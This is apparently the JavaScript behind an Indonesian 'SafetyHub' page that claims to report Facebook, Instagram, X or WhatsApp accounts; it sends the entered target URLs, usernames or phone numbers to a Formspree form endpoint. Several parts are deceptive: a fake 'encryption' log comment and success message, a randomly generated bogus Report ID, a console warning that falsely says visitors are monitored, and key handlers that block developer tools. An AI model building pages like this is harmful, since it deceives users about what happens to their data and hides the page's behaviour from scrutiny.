/* [SYSTEM LOG] Initializing encryption handler... */
const _0x_a1 = "https://formspree.io/f/mjgapqgd";
let _0x_b2 = 'fb';

// Anti Inspect Element Peringatan
(function() {
    const _s = "color: red; font-size: 24px; font-weight: bold; text-shadow: 1px 1px 2px black;";
    console.log("%c⚠️ ACCESS DENIED!", _s);
    console.log("%cAktivitas Anda sedang dipantau oleh SafetyHub Internal Security.", "color: white; background: black; padding: 5px;");
})();

function _0x11b2() {
    document.getElementById('sidebar').classList.toggle('closed');
    document.getElementById('main').classList.toggle('full');
}

function _0x4f22(_0x_p) {
    _0x_b2 = _0x_p;
    document.querySelectorAll('.nav-item').forEach(e => e.classList.remove('active'));
    document.getElementById('item-' + _0x_p).classList.add('active');
    
    const _0x_t = document.getElementById('form-title'), 
          _0x_l = document.getElementById('input-label'), 
          _0x_br = document.getElementById('breadcrumb'), 
          _0x_s = document.getElementById('submitBtn'), 
          _0x_i = document.getElementById('target');

    const _0x_m = {
        'fb': ['Laporan Akun Facebook', 'URL Profil:', 'Tools / Facebook', '#1877F2', 'https://facebook.com/user'],
        'ig': ['Laporan Akun Instagram', 'Username:', 'Tools / Instagram', '#E4405F', 'username_target'],
        'x': ['Report X Account', '@Handle:', 'Tools / X', '#000000', '@username'],
        'wa': ['Laporan WhatsApp', 'Nomor:', 'Tools / WhatsApp', '#25D366', '+628...']
    };

    _0x_t.innerText = _0x_m[_0x_p][0];
    _0x_l.innerText = _0x_m[_0x_p][1];
    _0x_br.innerText = _0x_m[_0x_p][2];
    _0x_s.style.backgroundColor = _0x_m[_0x_p][3];
    _0x_s.style.color = "#ffffff";
    _0x_i.placeholder = _0x_m[_0x_p][4];
}

document.getElementById('reportForm').addEventListener('submit', function(_0x_e) {
    _0x_e.preventDefault();
    const _0x_btn = document.getElementById('submitBtn');
    _0x_btn.innerText = "MENYAMBUNGKAN KE SERVER..."; 
    _0x_btn.disabled = true;
    
    fetch(_0x_a1, {
        method: 'POST',
        body: new FormData(this),
        headers: { 'Accept': 'application/json' }
    }).then(_0x_r => {
        if (_0x_r.ok) {
            document.getElementById('overlay').style.display = 'flex';
            document.getElementById('modalMsg').innerHTML = `✅ <b>Laporan Berhasil Dienkripsi!</b><br><br><small>Sistem telah menerbitkan Report ID: #SR-${Math.floor(Math.random() * 89999) + 10000}</small>`;
            this.reset();
        } else { alert("Error: Jalur Enkripsi API Terputus."); }
    }).catch(() => { alert("Koneksi Gagal! Server tidak merespon."); }).finally(() => { _0x_btn.innerText = "KIRIM LAPORAN SEKARANG"; _0x_btn.disabled = false; });
});

function _0x99a1() {
    const _0x_body = document.body;
    _0x_body.setAttribute("data-theme", _0x_body.getAttribute("data-theme") === "light" ? "dark" : "light");
}

// Tambahan: Mencegah tombol F12 (Inspect)
document.onkeydown = function(e) {
    if(e.keyCode == 123) return false;
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
}
